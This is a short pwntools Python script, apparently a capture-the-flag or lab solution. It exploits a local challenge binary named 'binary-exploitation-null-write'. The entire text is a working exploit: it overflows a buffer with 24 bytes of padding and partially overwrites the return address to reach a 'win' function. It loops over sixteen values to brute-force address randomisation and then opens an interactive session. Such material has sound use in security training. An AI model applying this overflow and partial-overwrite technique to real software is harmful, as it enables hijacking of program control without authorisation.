from pwn import *

offset = 0x10 + 8
win_bypass = 0x16fe

for i in "0123456789abcdef":
    r = process("/challenge/binary-exploitation-null-write")
    payload = offset * b'S' + b'\xfe' + bytes.fromhex(f"{i}7")
    r.send(payload)
    r.interactive()